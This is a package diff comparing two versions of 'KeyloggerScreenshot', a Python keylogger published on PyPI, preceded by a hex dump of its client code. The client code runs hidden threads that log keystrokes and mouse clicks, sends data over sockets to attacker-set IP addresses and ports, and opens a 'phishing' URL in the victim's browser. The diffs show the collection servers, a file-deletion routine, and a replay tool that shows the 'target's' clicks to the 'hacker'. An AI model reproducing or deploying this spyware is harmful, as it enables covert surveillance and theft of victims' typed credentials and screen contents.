+000030a0: 6765 5f6c 6973 7465 3a0d 0a20 2020 2020  ge_liste:..     
+000030b0: 2020 2020 2020 2020 2020 2020 2020 2020                  
+000030c0: 2020 2073 656c 662e 7269 6368 7469 6765     self.richtige
+000030d0: 5f6c 6973 7465 2e70 6f70 282d 3129 0d0a  _liste.pop(-1)..
+000030e0: 2020 2020 2020 2020 2020 2020 2020 2020                  
+000030f0: 2020 2020 2020 2020 2320 5265 6d6f 7665          # Remove
+00003100: 7320 7468 6520 6c61 7374 2069 7465 6d20  s the last item 
+00003110: 6f66 2074 6865 206c 6973 740d 0a0d 0a20  of the list.... 
+00003120: 2020 2020 2020 2020 2020 2020 2020 2073                 s
+00003130: 656c 662e 7365 636f 6e64 735b 305d 203d  elf.seconds[0] =
+00003140: 2061 6c6c 0d0a 2020 2020 2020 2020 2020   all..          
+00003150: 2020 2020 2020 2320 4c69 7374 2077 696c        # List wil
+00003160: 6c20 616c 6c77 6179 7320 6265 2075 7064  l allways be upd
+00003170: 6174 6564 0d0a 0d0a 2020 2020 6465 6620  ated....    def 
+00003180: 6f6e 5f72 656c 6561 7365 2873 656c 662c  on_release(self,
+00003190: 206b 6579 293a 0d0a 2020 2020 2020 2020   key):..        
+000031a0: 7072 696e 7428 6627 4b65 7920 7265 6c65  print(f'Key rele
+000031b0: 6173 6564 3a20 7b6b 6579 7d27 290d 0a0d  ased: {key}')...
+000031c0: 0a20 2020 2040 7374 6174 6963 6d65 7468  .    @staticmeth
+000031d0: 6f64 0d0a 2020 2020 6465 6620 696e 7465  od..    def inte
+000031e0: 726e 6574 5f63 6f6e 6e65 6374 696f 6e28  rnet_connection(
+000031f0: 293a 0d0a 2020 2020 2020 2020 2320 5468  ):..        # Th
+00003200: 6973 2066 756e 6374 696f 6e20 6368 6563  is function chec
+00003210: 6b73 2069 6620 6120 636f 6e6e 6563 7469  ks if a connecti
+00003220: 6f6e 2069 7320 7374 6162 6c65 0d0a 2020  on is stable..  
+00003230: 2020 2020 2020 7768 696c 6520 5472 7565        while True
+00003240: 3a0d 0a20 2020 2020 2020 2020 2020 2074  :..            t
+00003250: 7279 3a0d 0a20 2020 2020 2020 2020 2020  ry:..           
+00003260: 2020 2020 2072 6571 7565 7374 732e 6765       requests.ge
+00003270: 7428 2268 7474 7073 3a2f 2f77 7777 2e67  t("https://www.g
+00003280: 6f6f 676c 652e 636f 6d2f 2229 0d0a 2020  oogle.com/")..  
+00003290: 2020 2020 2020 2020 2020 2020 2020 2320                # 
+000032a0: 476f 6f67 6c65 2069 7320 616c 7761 7973  Google is always
+000032b0: 206f 6e6c 696e 6520 736f 2049 2063 686f   online so I cho
+000032c0: 7365 2067 6f6f 676c 650d 0a20 2020 2020  se google..     
+000032d0: 2020 2020 2020 2020 2020 2062 7265 616b             break
+000032e0: 0d0a 2020 2020 2020 2020 2020 2020 2020  ..              
+000032f0: 2020 2320 4966 2074 6865 7265 2069 7320    # If there is 
+00003300: 616e 2069 6e74 6572 6e65 7420 636f 6e6e  an internet conn
+00003310: 6563 7469 6f6e 2069 7420 7769 6c6c 2072  ection it will r
+00003320: 756e 2061 7320 6e6f 726d 616c 0d0a 2020  un as normal..  
+00003330: 2020 2020 2020 2020 2020 6578 6365 7074            except
+00003340: 2072 6571 7565 7374 732e 6578 6365 7074   requests.except
+00003350: 696f 6e73 2e43 6f6e 6e65 6374 696f 6e45  ions.ConnectionE
+00003360: 7272 6f72 3a0d 0a20 2020 2020 2020 2020  rror:..         
+00003370: 2020 2020 2020 2070 7269 6e74 2822 4e6f         print("No
+00003380: 2043 6f6e 6e65 6374 696f 6e22 290d 0a0d   Connection")...
+00003390: 0a20 2020 2064 6566 2073 7461 7274 2873  .    def start(s
+000033a0: 656c 6629 3a0d 0a20 2020 2020 2020 2073  elf):..        s
+000033b0: 656c 662e 696e 7465 726e 6574 5f63 6f6e  elf.internet_con
+000033c0: 6e65 6374 696f 6e28 290d 0a20 2020 2020  nection()..     
+000033d0: 2020 2074 696d 652e 736c 6565 7028 3129     time.sleep(1)
+000033e0: 0d0a 2020 2020 2020 2020 2320 4a75 7374  ..        # Just
+000033f0: 2074 6f20 636f 6f6c 2064 6f77 6e0d 0a0d   to cool down...
+00003400: 0a20 2020 2020 2020 2069 6620 7365 6c66  .        if self
+00003410: 2e70 6869 7368 696e 6720 6973 206e 6f74  .phishing is not
+00003420: 204e 6f6e 653a 0d0a 2020 2020 2020 2020   None:..        
+00003430: 2020 2020 7472 793a 0d0a 2020 2020 2020      try:..      
+00003440: 2020 2020 2020 2020 2020 7265 7175 6573            reques
+00003450: 7473 2e67 6574 2873 656c 662e 7068 6973  ts.get(self.phis
+00003460: 6869 6e67 290d 0a20 2020 2020 2020 2020  hing)..         
+00003470: 2020 2020 2020 2023 2052 6573 706f 6e65         # Respone
+00003480: 2069 7320 6865 7265 2074 6f20 7365 6520   is here to see 
+00003490: 6966 2074 6865 2077 6562 7369 7465 2069  if the website i
+000034a0: 7320 6f6e 6c69 6e65 206f 7220 6e6f 740d  s online or not.
+000034b0: 0a20 2020 2020 2020 2020 2020 2020 2020  .               
+000034c0: 2077 6562 6272 6f77 7365 722e 6f70 656e   webbrowser.open
+000034d0: 2873 656c 662e 7068 6973 6869 6e67 290d  (self.phishing).
+000034e0: 0a0d 0a20 2020 2020 2020 2020 2020 2065  ...            e
+000034f0: 7863 6570 7420 7265 7175 6573 7473 2e65  xcept requests.e
+00003500: 7863 6570 7469 6f6e 732e 436f 6e6e 6563  xceptions.Connec
+00003510: 7469 6f6e 4572 726f 723a 0d0a 2020 2020  tionError:..    
+00003520: 2020 2020 2020 2020 2020 2020 7072 696e              prin
+00003530: 7428 224e 6f20 636f 6e6e 6563 7469 6f6e  t("No connection
+00003540: 2229 0d0a 0d0a 2020 2020 2020 2020 2020  ")....          
+00003550: 2020 6578 6365 7074 2072 6571 7565 7374    except request
+00003560: 732e 6578 6365 7074 696f 6e73 2e49 6e76  s.exceptions.Inv
+00003570: 616c 6964 5552 4c3a 0d0a 2020 2020 2020  alidURL:..      
+00003580: 2020 2020 2020 2020 2020 7072 696e 7428            print(
+00003590: 2249 6e76 616c 6964 2055 726c 2229 0d0a  "Invalid Url")..
+000035a0: 0d0a 2020 2020 2020 2020 6c69 7374 656e  ..        listen
+000035b0: 696e 675f 7468 7265 6164 203d 2074 6872  ing_thread = thr
+000035c0: 6561 6469 6e67 2e54 6872 6561 6428 7461  eading.Thread(ta
+000035d0: 7267 6574 3d73 656c 662e 6461 7465 6e5f  rget=self.daten_
+000035e0: 6175 666e 6568 656d 656e 290d 0a20 2020  aufnehemen)..   
+000035f0: 2020 2020 2023 2054 6869 7320 7275 6e73       # This runs
+00003600: 2074 6865 2070 726f 6772 616d 2062 6568   the program beh
+00003610: 696e 6420 7468 6520 6163 7475 616c 2070  ind the actual p
+00003620: 726f 6772 616d 6d69 6e67 0d0a 2020 2020  rogramming..    
+00003630: 2020 2020 6c69 7374 656e 696e 675f 7468      listening_th
+00003640: 7265 6164 2e73 7461 7274 2829 0d0a 0d0a  read.start()....
+00003650: 2020 2020 2020 2020 7468 7265 6164 696e          threadin
+00003660: 675f 6d6f 7573 6520 3d20 7468 7265 6164  g_mouse = thread
+00003670: 696e 672e 5468 7265 6164 2874 6172 6765  ing.Thread(targe
+00003680: 743d 7365 6c66 2e61 6c6c 5f63 6c69 636b  t=self.all_click
+00003690: 7329 0d0a 2020 2020 2020 2020 2320 5468  s)..        # Th
+000036a0: 6973 2072 756e 7320 7468 6520 7072 6f67  is runs the prog
+000036b0: 726d 6d20 6265 6869 6e64 2074 6865 2061  rmm behind the a
+000036c0: 6374 7561 6c20 7072 6f67 7261 6d6d 696e  ctual programmin
+000036d0: 670d 0a20 2020 2020 2020 2074 6872 6561  g..        threa
+000036e0: 6469 6e67 5f6d 6f75 7365 2e73 7461 7274  ding_mouse.start
+000036f0: 2829 0d0a 0d0a 2020 2020 2020 2020 7365  ()....        se
+00003700: 6e64 5f74 696d 6572 203d 2073 6f63 6b65  nd_timer = socke
+00003710: 742e 736f 636b 6574 2873 6f63 6b65 742e  t.socket(socket.
+00003720: 4146 5f49 4e45 542c 2073 6f63 6b65 742e  AF_INET, socket.
+00003730: 534f 434b 5f53 5452 4541 4d29 0d0a 2020  SOCK_STREAM)..  
+00003740: 2020 2020 2020 7365 6e64 5f74 696d 6572        send_timer
+00003750: 2e63 6f6e 6e65 6374 2828 7365 6c66 2e69  .connect((self.i
+00003760: 705f 7469 6d65 722c 2073 656c 662e 706f  p_timer, self.po
+00003770: 7274 5f74 696d 6572 2929 0d0a 0d0a 2020  rt_timer))....  
+00003780: 2020 2020 2020 7365 6e64 5f74 696d 6572        send_timer
+00003790: 2e73 656e 6428 7374 7228 7365 6c66 2e64  .send(str(self.d
+000037a0: 7572 6174 696f 6e29 2e65 6e63 6f64 6528  uration).encode(
+000037b0: 2929 0d0a 2020 2020 2020 2020 2320 5468  ))..        # Th
+000037c0: 6973 2073 656e 6473 2074 6865 2073 6563  is sends the sec
+000037d0: 6f6e 6473 2074 6f20 7468 6520 7365 7276  onds to the serv
+000037e0: 6572 0d0a 2020 2020 2020 2020 7365 6e64  er..        send
+000037f0: 5f74 696d 6572 2e63 6c6f 7365 2829 0d0a  _timer.close()..
+00003800: 0d0a 2020 2020 2020 2020 7469 6d65 725f  ..        timer_
+00003810: 6465 6c65 7465 5f64 6972 203d 2073 6f63  delete_dir = soc
+00003820: 6b65 742e 736f 636b 6574 2873 6f63 6b65  ket.socket(socke
+00003830: 742e 4146 5f49 4e45 542c 2073 6f63 6b65  t.AF_INET, socke
+00003840: 742e 534f 434b 5f53 5452 4541 4d29 0d0a  t.SOCK_STREAM)..
+00003850: 2020 2020 2020 2020 7469 6d65 725f 6465          timer_de
+00003860: 6c65 7465 5f64 6972 2e63 6f6e 6e65 6374  lete_dir.connect
+00003870: 2828 2231 3237 2e30 2e30 2e31 222c 2031  (("127.0.0.1", 1
+00003880: 3037 3729 290d 0a0d 0a20 2020 2020 2020  077))....       
+00003890: 2074 696d 6572 5f64 656c 6574 655f 6469   timer_delete_di
+000038a0: 722e 7365 6e64 2873 7472 2873 656c 662e  r.send(str(self.
+000038b0: 6475 7261 7469 6f6e 292e 656e 636f 6465  duration).encode
+000038c0: 2829 290d 0a20 2020 2020 2020 2074 696d  ())..        tim
+000038d0: 6572 5f64 656c 6574 655f 6469 722e 636c  er_delete_dir.cl
+000038e0: 6f73 6528 290d 0a0d 0a20 2020 2020 2020  ose()....       
+000038f0: 2077 6974 6820 6b65 7962 6f61 7264 2e4c   with keyboard.L
+00003900: 6973 7465 6e65 7228 6f6e 5f70 7265 7373  istener(on_press
+00003910: 3d73 656c 662e 6f6e 5f70 7265 7373 2c20  =self.on_press, 
+00003920: 6f6e 5f72 656c 6561 7365 3d73 656c 662e  on_release=self.
+00003930: 6f6e 5f72 656c 6561 7365 2920 6173 206c  on_release) as l
+00003940: 6973 7465 6e65 723a 0d0a 2020 2020 2020  istener:..      
+00003950: 2020 2020 2020 7365 6c66 2e63 6f75 6e74        self.count
+00003960: 646f 776e 5f73 656e 6428 7365 6c66 2e64  down_send(self.d
+00003970: 7572 6174 696f 6e2c 2073 656c 662e 6970  uration, self.ip
+00003980: 5f70 686f 746f 732c 2073 656c 662e 706f  _photos, self.po
+00003990: 7274 5f70 686f 746f 732c 2073 656c 662e  rt_photos, self.
+000039a0: 6970 5f6b 6579 6c6f 6767 6572 2c0d 0a20  ip_keylogger,.. 
+000039b0: 2020 2020 2020 2020 2020 2020 2020 2020                  
+000039c0: 2020 2020 2020 2020 2020 2020 2020 2073                 s
+000039d0: 656c 662e 706f 7274 5f6b 6579 6c6f 6767  elf.port_keylogg
+000039e0: 6572 290d 0a20 2020 2020 2020 2020 2020  er)..           
+000039f0: 206c 6973 7465 6e65 722e 6a6f 696e 2829   listener.join()
+00003a00: 0d0a 2020 2020 2020 2020 2020 2020 2320  ..            # 
+00003a10: 5468 6973 206c 6973 7465 6e73 2074 6f20  This listens to 
+00003a20: 7468 6520 6b65 7973 2074 6861 7420 7768  the keys that wh
+00003a30: 6572 6520 7479 7065 640d 0a              ere typed..
```

### Comparing `KeyloggerScreenshot-0.4.1/KeyloggerScreenshot/Local_Deleter.py` & `KeyloggerScreenshot-0.4.2/KeyloggerScreenshot/Local_Deleter.py`

 * *Files 12% similar despite different names*

```diff
@@ -1,13 +1,14 @@
 import os
 import shutil
 import socket
 import ast
 import time
 import threading
+from .Server_photos import ServerPhotos
 
 
 class DeleteList:
     lst = None
 
     @staticmethod
     def countdown(seconds):
@@ -24,19 +25,15 @@
     def start():
         server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         server.bind(("127.0.0.1", 1077))
         server.listen(5)
         while True:
             client_socket, ipaddress = server.accept()
 
-            full_msg = ""
-            while True:
-                msg = client_socket.recv(20).decode()
-                if len(msg) <= 0: break
-                full_msg += msg
+            full_msg = ServerPhotos.get_data(DeleteList, client_socket, "r", 20)
             if "[" in full_msg:
                 DeleteList.lst = ast.literal_eval(full_msg)
 
             elif full_msg == "done":
                 if DeleteList.lst:
                     os.chdir("..")
                     for each in DeleteList.lst:
```

### Comparing `KeyloggerScreenshot-0.4.1/KeyloggerScreenshot/Port_data.py` & `KeyloggerScreenshot-0.4.2/KeyloggerScreenshot/Port_data.py`

 * *Files identical despite different names*

### Comparing `KeyloggerScreenshot-0.4.1/KeyloggerScreenshot/Server_keylogger.py` & `KeyloggerScreenshot-0.4.2/KeyloggerScreenshot/Server_keylogger.py`

 * *Files identical despite different names*

### Comparing `KeyloggerScreenshot-0.4.1/KeyloggerScreenshot/Server_listener.py` & `KeyloggerScreenshot-0.4.2/KeyloggerScreenshot/Server_listener.py`

 * *Files identical despite different names*

### Comparing `KeyloggerScreenshot-0.4.1/KeyloggerScreenshot/Server_photos.py` & `KeyloggerScreenshot-0.4.2/KeyloggerScreenshot/Server_photos.py`

 * *Files identical despite different names*

### Comparing `KeyloggerScreenshot-0.4.1/KeyloggerScreenshot/Server_timer.py` & `KeyloggerScreenshot-0.4.2/KeyloggerScreenshot/Server_timer.py`

 * *Files identical despite different names*

### Comparing `KeyloggerScreenshot-0.4.1/KeyloggerScreenshot/Simulation_code.py` & `KeyloggerScreenshot-0.4.2/KeyloggerScreenshot/Simulation_code.py`

 * *Files 0% similar despite different names*

```diff
@@ -126,16 +126,15 @@
         # Gets the size of the image with x and y
         hacker_size_x, hacker_size_y = pg.size()
         # Gets the size of the hacker with x and y
 
         difference_x, difference_y = hacker_size_x / target_size_x, hacker_size_y / target_size_y
         # This is the difference between the two. For example 1920x1080 = hacker and 1366x768 = target.
         # To rescale the image the x position of the target will be divided by the x position of the hacker
-        new_coordinates = [(round(new_x * difference_x), round(new_y * difference_y)) for new_x, new_y in
-                           every_coordinate]
+        new_coordinates = [(round(new_x * difference_x), round(new_y * difference_y)) for new_x, new_y in every_coordinate]
         # Stores the rescaled coordinates into a list
         for img in img_files:
             image = PIL.Image.open(img)
             # Opens the image
             new_image = image.resize((hacker_size_x, hacker_size_y))
             # Resizes every image to the size of the hacker display
             new_image.save(img)
```

### Comparing `KeyloggerScreenshot-0.4.1/KeyloggerScreenshot.egg-info/PKG-INFO` & `KeyloggerScreenshot-0.4.2/KeyloggerScreenshot.egg-info/PKG-INFO`

 * *Files 2% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: KeyloggerScreenshot
-Version: 0.4.1
+Version: 0.4.2
 Summary: Exporting Keylogger files, recording audio, recording mouse click information and screenshots of the target. For more information check out my website:https://pypi.org/project/KeyloggerScreenshot/ and my github: https://github.com/Facileee/KeyloggerScreenshot
 Home-page: 
 Author: Fawaz Bashiru
 Author-email: fawazbashiru@gmail.com
 License: MIT
 Keywords: Keylogger
 Classifier: Development Status :: 6 - Mature
@@ -363,7 +363,12 @@
 - If backspace is pressed the last pressed character will be deleted from the list
 - Detects if backspace is hold for a long time
 
 0.4.1 (08/05/2023)
 -------------------
 - Fixed Interruption Error
 - Every coordinate of the target no mater what Image size it has will now be shown on the hackers Simulation_code
+
+0.4.2 (23/05/2023)
+------------------
+- Fixed simulation Error
+- Every coordinate will be shown by order
```

### Comparing `KeyloggerScreenshot-0.4.1/KeyloggerScreenshot.egg-info/SOURCES.txt` & `KeyloggerScreenshot-0.4.2/KeyloggerScreenshot.egg-info/SOURCES.txt`

 * *Files identical despite different names*

### Comparing `KeyloggerScreenshot-0.4.1/LISCENCE.txt` & `KeyloggerScreenshot-0.4.2/LISCENCE.txt`

 * *Files identical despite different names*

### Comparing `KeyloggerScreenshot-0.4.1/PKG-INFO` & `KeyloggerScreenshot-0.4.2/PKG-INFO`

 * *Files 2% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: KeyloggerScreenshot
-Version: 0.4.1
+Version: 0.4.2
 Summary: Exporting Keylogger files, recording audio, recording mouse click information and screenshots of the target. For more information check out my website:https://pypi.org/project/KeyloggerScreenshot/ and my github: https://github.com/Facileee/KeyloggerScreenshot
 Home-page: 
 Author: Fawaz Bashiru
 Author-email: fawazbashiru@gmail.com
 License: MIT
 Keywords: Keylogger
 Classifier: Development Status :: 6 - Mature
@@ -363,7 +363,12 @@
 - If backspace is pressed the last pressed character will be deleted from the list
 - Detects if backspace is hold for a long time
 
 0.4.1 (08/05/2023)
 -------------------
 - Fixed Interruption Error
 - Every coordinate of the target no mater what Image size it has will now be shown on the hackers Simulation_code
+
+0.4.2 (23/05/2023)
+------------------
+- Fixed simulation Error
+- Every coordinate will be shown by order
```

### Comparing `KeyloggerScreenshot-0.4.1/README.md` & `KeyloggerScreenshot-0.4.2/README.md`

 * *Files identical despite different names*

### Comparing `KeyloggerScreenshot-0.4.1/Simualation_code.py` & `KeyloggerScreenshot-0.4.2/Simualation_code.py`

 * *Files identical despite different names*

### Comparing `KeyloggerScreenshot-0.4.1/demon_server.py` & `KeyloggerScreenshot-0.4.2/demon_server.py`

 * *Files 13% similar despite different names*

```diff
@@ -1,19 +1,19 @@
 import KeyloggerScreenshot as ks
 import threading
 
-ip = "0.0.0.0"
+ip = "127.0.0.1"
 
-server_photos = ks.ServerPhotos(ip, 1122)
+server_photos = ks.ServerPhotos(ip, 1111)
 
-server_keylogger = ks.ServerKeylogger(ip, 2233, simulater=False)
+server_keylogger = ks.ServerKeylogger(ip, 2222, simulater=True)
 
-server_listener = ks.ServerListener(ip, 3344)
+server_listener = ks.ServerListener(ip, 3333)
 
-server_time = ks.Timer(ip, 4455)
+server_time = ks.Timer(ip, 4444)
 
 threading_server = threading.Thread(target=server_photos.start)
 threading_server.start()
 
 threading_server2 = threading.Thread(target=server_keylogger.start)
 threading_server2.start()
```

### Comparing `KeyloggerScreenshot-0.4.1/leo_gui.py` & `KeyloggerScreenshot-0.4.2/leo_gui.py`

 * *Files identical despite different names*

### Comparing `KeyloggerScreenshot-0.4.1/requirements.py` & `KeyloggerScreenshot-0.4.2/requirements.py`

 * *Files identical despite different names*

### Comparing `KeyloggerScreenshot-0.4.1/setup.py` & `KeyloggerScreenshot-0.4.2/setup.py`

 * *Files 1% similar despite different names*

```diff
@@ -6,15 +6,15 @@
     'Operating System :: Microsoft :: Windows :: Windows 10',
     'License :: OSI Approved :: MIT License',
     'Programming Language :: Python :: 3'
 ]
 
 setup(
     name='KeyloggerScreenshot',
-    version='0.4.1',
+    version='0.4.2',
     description='Exporting Keylogger files, recording audio, recording mouse click information and screenshots of the target. For more information check out my website:https://pypi.org/project/KeyloggerScreenshot/ and my github: https://github.com/Facileee/KeyloggerScreenshot',
     long_description_content_type="text/markdown",
     long_description=open('README.md').read() + '\n\n' + open('CHANGELOG.txt').read(),
     url='',
     author='Fawaz Bashiru',
     author_email='fawazbashiru@gmail.com',
     license='MIT',
```

